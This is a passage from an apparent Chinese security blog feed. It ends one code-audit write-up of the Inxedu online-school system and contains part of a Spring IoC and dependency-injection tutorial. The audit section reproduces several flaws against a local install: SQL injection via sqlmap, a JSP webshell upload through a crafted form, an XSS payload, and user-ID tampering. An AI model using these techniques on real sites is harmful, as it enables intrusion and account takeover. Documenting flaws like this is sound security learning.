alt></p><p>可以看到控制层直接获取了articelId参数，这里的参数我们是可控的。</p><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>首先登录后台。找到文章管理部分，选择删除，抓包。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213121827.png" alt></p><p>直接扔到sqlmap里跑。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213122138.png" alt="QQ截图20210213122138"></p><p>可以看到这套系统中还有多处存在这个漏洞。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213175257.png" alt></p><h4 id="后台任意文件上传漏洞"><a href="#后台任意文件上传漏洞" class="headerlink" title="后台任意文件上传漏洞"></a>后台任意文件上传漏洞</h4><h5 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h5><p>位置com/inxedu/os/common/controller/VideoUploadController.java,上传视频功能。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213180316.png" alt></p><p>  可以看到这里首先接收了fileType扩展名参数，然后仅仅判断了上传的文件名与fileType参数文件是否一致，就直接上传文件，然后返回了文件上传路径。</p><p>这里我们可以直接将fileType设置为jsp就可以直接上传jsp马。</p><h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action="http://localhost:8080/video/uploadvideo" enctype="multipart/form-data" id="frmUpload" <span class="keyword">method</span>="post"&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="type">name</span>="uploadfile" <span class="keyword">type</span>="file"&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span> ="text" <span class="type">name</span> = "fileType" <span class="keyword">value</span>=""&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> id="btnUpload" <span class="keyword">type</span>="submit" <span class="keyword">value</span>="上传"&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>构造上传表单</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213121211.png" alt></p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213121225.png" alt></p><h4 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h4><h5 id="源码审计-1"><a href="#源码审计-1" class="headerlink" title="源码审计"></a>源码审计</h5><p>漏洞位置:CourseController.java,功能点为前台查询课程处。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212122514.png" alt></p><p>我们知道${queryCourse.courseName}是spring的EL表达式。代表queryCourse这个实体类下面courseName的值，我们geng</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213182040.png" alt></p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213182147.png" alt></p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213182225.png" alt></p><h5 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>找到搜索课程处，插入漏洞payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213115840.png" alt></p><h4 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h4><h5 id="源码审计-2"><a href="#源码审计-2" class="headerlink" title="源码审计"></a>源码审计</h5><p>漏洞位置:UserController.java，功能为修改用户信息。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213185228.png" alt></p><p>跟进对应的接口的实现类。发现并没有判断用户的权限。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213185425.png" alt></p><p>继续跟进对应接口的实现类，直接引用mapper文件更新信息  。     </p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213185436.png" alt></p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212133339.png" alt></p><h5 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>首先注册两个账户，记下user.userId。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213183058.png" alt></p><p>登录另一个账户，抓包，替换user.userId，即可越权修改对应id的用户信息。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213183308.png" alt></p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213183430.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;     因酷开源网校系统是由北京因酷时代科技有限公司以下简称（因酷教育软件）研发并推出的国内首家Java版开源网校源代码建站系统，并免费提
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Java安全--Spring框架基础学习</title>
    <link href="https://shu1l.github.io/2021/02/12/java-an-quan-spring-ji-chu-xue-xi/"/>
    <id>https://shu1l.github.io/2021/02/12/java-an-quan-spring-ji-chu-xue-xi/</id>
    <published>2021-02-12T12:00:33.000Z</published>
    <updated>2021-08-20T04:43:32.613Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Spring–IOC"><a href="#Spring–IOC" class="headerlink" title="Spring–IOC"></a>Spring–IOC</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>spring的核心思想是IOC和AOP，IoC - Inversion of Control, 控制反转，通俗点说就是把创建和管理bean的过程转移给了第三方。而这个第三方就是我们说的IOC容器。</p><p>Spring容器将创建对象,把它们连接在一起,配置它们,并管理他们的整个生命周期从创建到销毁。控制着bean的依赖注入。</p><p><strong>那么这里为什么要叫做控制反转呢?</strong></p><p>我们先来对比下两种不同的获取外部对象的资源的方法。</p><ul><li>主动去创建相关对象然后再组合。</li></ul><p><img src="/2021/02/12/java-an-quan-spring-ji-chu-xue-xi/261421378318292.jpg" alt="img"></p><ul><li>IOC/DI容器中</li></ul><p><img src="/2021/02/12/java-an-quan-spring-ji-chu-xue-xi/img.png" alt="img"></p><p>在 Spring 中，类的实例化、依赖的实例化、依赖的传入都交由 Spring Bean 容器控制，而不是用<code>new</code>方式实例化对象、通过非构造函数方法传入依赖等常规方式。<strong>实质的控制权已经交由程序管理，而不是程序员管理，所以叫做控制反转。</strong></p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>有一个<code>Book</code>类：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Book</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> name ;     <span class="comment">//书名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> money;        /价格  </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Book</span><span class="params">(<span class="keyword">String</span> name, <span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.money = money;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Person</code>类依赖于<code>Book</code>类，</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="symbol">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Book book;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Person(Book book) &#123;</span><br><span class="line">        <span class="keyword">this</span>.book = book;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    因为IoC容器要负责实例化所有的组件，因此，有必要告诉容器如何创建组件，以及各组件的依赖关系。一种最简单的配置是通过XML文件来实现，例如：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans&gt;</span><br><span class="line">    &lt;bean id=<span class="string">"dataSource"</span> <span class="keyword">class</span>="<span class="symbol">HikariDataSource</span>" /&gt;</span><br><span class="line">    &lt;<span class="symbol">bean</span> <span class="symbol">id</span>="<span class="symbol">bookService</span>" <span class="symbol">class</span>="<span class="symbol">BookService</span>"&gt;</span><br><span class="line">        &lt;<span class="symbol">property</span> <span class="symbol">name</span>="<span class="symbol">dataSource</span>" <span class="symbol">ref</span>="<span class="symbol">dataSource</span>" /&gt;</span><br><span class="line">    &lt;/<span class="symbol">bean</span>&gt;</span><br><span class="line">    &lt;<span class="symbol">bean</span> <span class="symbol">id</span>="<span class="symbol">userService</span>" <span class="symbol">class</span>="<span class="symbol">UserService</span>"&gt;</span><br><span class="line">        &lt;<span class="symbol">property</span> <span class="symbol">name</span>="<span class="symbol">dataSource</span>" <span class="symbol">ref</span>="<span class="symbol">dataSource</span>" /&gt;</span><br><span class="line">    &lt;/<span class="symbol">bean</span>&gt;</span><br><span class="line">&lt;/<span class="symbol">beans</span>&gt;</span><br></pre></td></tr></table></figure><p>​    上述XML配置文件指示IoC容器创建3个JavaBean组件，并把id为<code>dataSource</code>的组件通过属性<code>dataSource</code>（即调用<code>setDataSource()</code>方法）注入到另外两个组件中。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在Spring的IoC容器中，我们把所有组件统称为JavaBean，即配置一个组件就是配置一个Bean,控制反转通过依赖注入(DI)方式实现对象之间的松耦合关系。</p><h3 id="Spring–Bean"><a href="#Spring–Bean" class="headerlink" title="Spring–Bean"></a>Spring–Bean</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>​    spring官方文档对bean的解释是:在spring中,构成应用程序主干并由Spring IoC容器管理的对象称为bean。bea是一个由Spring IoC容器实例化、组装和管理的对象。</p><p>bean主要包含以下几个概念:</p><ul><li>Bean容器，或称spring ioc容器，主要用来管理对象和依赖，以及依赖的注入。</li><li>bean是一个java对象,根据bean规范编写出来的类,并由bean容器生成的对象就是一个bean。</li><li>bean规范</li></ul><p><img src="/2021/02/12/java-an-quan-spring-ji-chu-xue-xi/ioc-bean.png" alt="img"></p><h4 id="Bean实例化"><a href="#Bean实例化" class="headerlink" title="Bean实例化"></a>Bean实例化</h4><h5 id="1-普通构造方法创建"><a href="#1-普通构造方法创建" class="headerlink" title="1.普通构造方法创建"></a>1.普通构造方法创建</h5><p>使用比较多的一种创建方式，可以直接配置bean节点,例如:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"add()---------"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在xml中简单配置一个bean节点，如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="attribute">class</span>=<span class="string">"org.test.Demo"</span> <span class="attribute">id</span>=<span class="string">"test"</span>/&gt;</span><br></pre></td></tr></table></figure><p>通过以下代码进行简单的测试：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ApplicationContext context = <span class="keyword">new</span> <span class="constructor">ClassPathXmlApplicationContext(<span class="string">"applicationContext.xml"</span>)</span>;</span><br><span class="line">        Demo test = (Demo) context.get<span class="constructor">Bean(<span class="string">"test"</span>)</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(test);</span><br></pre></td></tr></table></figure><h5 id="2-静态工厂创建"><a href="#2-静态工厂创建" class="headerlink" title="2.静态工厂创建"></a>2.静态工厂创建</h5><p>通过静态构造方法来创建一个bean的实例，如下：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"add2()---------"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个静态工厂，如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo2Factory</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Demo2 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Demo2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该工厂中有一个静态方法，该静态方法返回一个的实例，通过Spring的配置文件生成Demo2的实例：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="attribute">id</span>=<span class="string">"demo2"</span> <span class="attribute">class</span>=<span class="string">"org.test.demo2Factory"</span> <span class="attribute">factory-method</span>=<span class="string">"getInstance"</span>/&gt;</span><br></pre></td></tr></table></figure><p>factory-method属性，该属性指明该类中的静态工厂方法名为getInstance，spring框架根据属性来调用方法来获取Demo2的实例了，测试代码如下：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"applicationContext.xml"</span>);</span><br><span class="line">        Demo2 demo = (Demo2) context.getBean(<span class="string">"demo2"</span>);</span><br><span class="line">        demo.add();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="实例工厂创建"><a href="#实例工厂创建" class="headerlink" title="实例工厂创建"></a>实例工厂创建</h5><p>通过实例工厂来创建bean实例，例如:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo3</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"add3()---------"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时有一个工厂方法，如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo3Factory</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Demo3 <span class="title">getDemo3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Demo3();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Demo3Factory类中有一个getDemo3的方法，该方法返回一个Demo3类的实例,Spring的配置文件如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="attribute">class</span>=<span class="string">"org.test.Demo3Factory"</span> <span class="attribute">id</span>=<span class="string">"demo3Factory"</span>/&gt;</span><br><span class="line">    &lt;bean <span class="attribute">id</span>=<span class="string">"demo3"</span> <span class="attribute">factory-bean</span>=<span class="string">"demo3Factory"</span> <span class="attribute">factory-method</span>=<span class="string">"getDemo3"</span>/&gt;</span><br></pre></td></tr></table></figure><p>第一个bean用来获取demo3Factory的实例，第二个bean则根据demo3Factory的实例，然后指定factory-method，通过getDemo3方法来获取Demo3的实例。<br>测试代码如下：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"applicationContext.xml"</span>);</span><br><span class="line">    Demo3 demo = (Demo3) context.getBean(<span class="string">"demo3"</span>);</span><br><span class="line">    demo.add();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Bean作用域"><a href="#Bean作用域" class="headerlink" title="Bean作用域"></a>Bean作用域</h4><p>spring bean 一共有五种作用域。</p><h5 id="1-Singleton-（缺省作用域、单例类型）"><a href="#1-Singleton-（缺省作用域、单例类型）" class="headerlink" title="1.Singleton （缺省作用域、单例类型）"></a>1.Singleton （缺省作用域、单例类型）</h5><p>​    容器中只存在一个共享的Bean，只要id与Bean定义相匹配，那就会是同一个Bean。在容器启动（实例化）时Bean就实例化和初始化（可以通过lazy-init=”true”来设置使得Bean被调用时才初始化）。</p><h5 id="2-Prototype-（原型类型）"><a href="#2-Prototype-（原型类型）" class="headerlink" title="2.Prototype （原型类型）"></a>2.Prototype （原型类型）</h5><p>​    对有状态的Bean建议使用Prototype，对无状态建议使用Singleton。<br>容器启动时并没有实例化Bean，只有获取Bean时才会被创建，并且每一次都是新建一个对象。</p><h5 id="3-request（web的Spring-ApplicationContext）"><a href="#3-request（web的Spring-ApplicationContext）" class="headerlink" title="3.request（web的Spring ApplicationContext）"></a>3.request（web的Spring ApplicationContext）</h5><p>​    每个HTTP 都会有自己的Bean，当处理结束时，Bean销毁。</p><h5 id="4-session（web的Spring-ApplicationContext）"><a href="#4-session（web的Spring-ApplicationContext）" class="headerlink" title="4.session（web的Spring ApplicationContext）"></a>4.session（web的Spring ApplicationContext）</h5><p>​    每一个Http session有自己的Bean</p><h5 id="5-global-session（web的Spring-ApplicationContext）"><a href="#5-global-session（web的Spring-ApplicationContext）" class="headerlink" title="5.global session（web的Spring ApplicationContext）"></a>5.global session（web的Spring ApplicationContext）</h5><p>​        global session作用域类似于标准的HTTP Session作用域，不过仅仅在基于portlet的web应用中才有意义。Portlet规范定义了全局Session的概念，它被所有构成某个portlet web应用的各种不同的portlet所共享。在global session作用域中定义的bean被限定于全局portlet Session的生命周期范围内。</p><h4 id="Bean生命周期"><a href="#Bean生命周期" class="headerlink" title="Bean生命周期"></a>Bean生命周期</h4><p>　　Spring Bean的完整生命周期从创建Spring容器开始，直到最终Spring容器销毁Bean，这其中包含了一系列关键点。</p><p><img src="/2021/02/12/java-an-quan-spring-ji-chu-xue-xi/181453414212067.png" alt="img"></p><p><img src="/2021/02/12/java-an-quan-spring-ji-chu-xue-xi/181454040628981.png" alt="img"></p><h5 id="单例管理的对象"><a href="#单例管理的对象" class="headerlink" title="单例管理的对象"></a>单例管理的对象</h5><p>Bean在容器启动时就会实例化和初始化，但是可以通过Bean的设置来设置对象的初始化时机<br>第一种：通过设置<bean></bean></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="attribute">id</span>=<span class="string">"ServiceImpl"</span> <span class="attribute">class</span>=<span class="string">"cn.csdn.service.ServiceImpl"</span> <span class="attribute">lazy-init</span>=<span class="string">"true"</span>/&gt;</span><br></pre></td></tr></table></figure><p>第二种：通过设置<Beans>来修改所有bean默认方式的初始化时机</Beans></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans <span class="keyword">default</span>-<span class="built_in">lazy</span>-<span class="keyword">init</span>=<span class="string">"true"</span>&gt;</span><br></pre></td></tr></table></figure><h5 id="非单例管理的对象"><a href="#非单例管理的对象" class="headerlink" title="非单例管理的对象"></a>非单例管理的对象</h5><p>Spring读取xml文件的时候，并不会立刻创建对象，而是在第一次请求该bean时才初始化（如调用getBean方法时）。<strong>容器只会实例化和初始化Bean，不会销毁Bean。清除prototype作用域的对象并释放任何prototype bean所持有的昂贵资源，都是客户端代码的职责。</strong>在初始化后交由调用者管理</p><h3 id="Spring–依赖注入-DI"><a href="#Spring–依赖注入-DI" class="headerlink" title="Spring–依赖注入(DI)"></a>Spring–依赖注入(DI)</h3><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><p>依赖注入(Dependency Injection，DI)，和控制反转含义相同，<strong>它们是从两个角度描述的同一个概念。</strong></p><p>​    当某个java实例(调用者)需要另一个java实例(被调用者)，我们通常采用的方法是由调用者来创建被调用者的实例。（使用new关键字获得被调用者的实例)。</p><p>​    在spring中，spring在创建被调用者的实例时，会自动将调用者需要的对象实例注入给调用者，调用者通过spring容器获得被调用者实例，被称为依赖注入。</p><h4 id="注入方式-bean装配"><a href="#注入方式-bean装配" class="headerlink" title="注入方式(bean装配)"></a>注入方式(bean装配)</h4><p>​    依赖注入的本质就是装配，装配是依赖注入的具体行为。在Spring中，注入依赖对象可以采用手工装配或自动装配。</p><p><strong>手工装配一般分为两种方式</strong>：</p><ul><li><p>一种是在XML文件中，通过在bean节点下配置；比如使用属性的setter方法注入依赖对象或者使用构造方法注入。</p></li><li><p>一种就是在java代码中使用注解的方式进行装配，在代码中加入@Resource或者@Autowired。</p></li></ul><h5 id="setter方法注入"><a href="#setter方法注入" class="headerlink" title="setter方法注入"></a>setter方法注入</h5><p>​    由于setter注入方式具有可选择性和灵活性高的特点，因此它也是实际开发中最常用的注入方式。setter方法更加直观，我们来看一下spring的配置文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用spring管理对象的创建，还有对象的依赖关系 --&gt;</span>    </span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao4Mysql"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.dao.UserDao4MysqlImpl"</span>/&gt;</span>     </span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao4Oracle"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.dao.UserDao4OracleImpl"</span>/&gt;</span>          </span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userManager"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.manager.UserManagerImpl"</span>&gt;</span>    </span><br><span class="line">       <span class="comment">&lt;!-- (1)userManager使用了userDao，Ioc是自动创建相应的UserDao实现，都是由容器管理--&gt;</span>    </span><br><span class="line">       <span class="comment">&lt;!-- (2)在UserManager中提供构造函数，让spring将UserDao实现注入（DI）过来 --&gt;</span>    </span><br><span class="line">       <span class="comment">&lt;!-- (3)让spring管理我们对象的创建和依赖关系，必须将依赖关系配置到spring的核心配置文件中 --&gt;</span>    </span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"userDao"</span> <span class="attr">ref</span>=<span class="string">"userDao4Oracle"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span>    </span><br><span class="line"> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接着我们来看一下，setter表示依赖关系的写法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tgb.spring.dao.UserDao;    </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserManagerImpl</span> <span class="keyword">implements</span> <span class="title">UserManager</span></span>&#123;     </span><br><span class="line">    <span class="keyword">private</span> UserDao userDao;    </span><br><span class="line">    <span class="comment">//使用设值方式赋值    </span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserDao</span><span class="params">(UserDao userDao)</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">this</span>.userDao = userDao;    </span><br><span class="line">    &#125;          </span><br><span class="line">    <span class="meta">@Override</span>    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">(String userName, String password)</span> </span>&#123;      </span><br><span class="line">        userDao.addUser(userName, password);    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="构造函数注入"><a href="#构造函数注入" class="headerlink" title="构造函数注入"></a>构造函数注入</h5><p>​    构造函数注入是除setter注入之外的另一种常用的注入方式，它可以保证一些必要的属性在bean实例化时就得到了设置，并在实例化后就可以使用。</p><p>使用构造函数注入的前提是： 